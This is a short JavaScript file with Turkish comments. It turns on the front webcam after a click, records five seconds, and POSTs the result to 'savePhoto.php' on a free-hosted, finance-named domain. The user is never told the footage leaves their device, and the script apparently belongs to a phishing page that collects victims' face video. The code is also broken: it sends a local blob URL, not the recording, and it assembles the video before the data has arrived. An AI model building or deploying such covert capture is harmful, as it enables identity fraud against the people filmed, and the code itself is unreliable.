const video = document.getElementById('video');
const startButton = document.getElementById('startButton');

startButton.addEventListener('click', startCapture);

function startCapture() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            video.srcObject = stream;
            video.play();

            let recorder;
            let chunks = [];

            setTimeout(() => {
                stopCapture();
            }, 5000); // 5 saniye sonra durdur

            function startRecording() {
                recorder = new MediaRecorder(stream);
                recorder.ondataavailable = function(event) {
                    chunks.push(event.data);
                };
                recorder.start();
            }

            function stopCapture() {
                video.pause();
                recorder.stop();

                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const dataURL = URL.createObjectURL(videoBlob);

                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hayatfinans.000webhostapp.com/c/savePhoto.php');
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        console.log('Video kaydedildi.');
                    } else {
                        console.error('Video kaydedilirken hata oluştu:', xhr.statusText);
                    }
                };
                xhr.send('data=' + encodeURIComponent(dataURL));
            }

            startRecording(); // Kayıt başlat
        })
        .catch(error => {
            console.error('Kamera erişimi reddedildi:', error);
        });
}
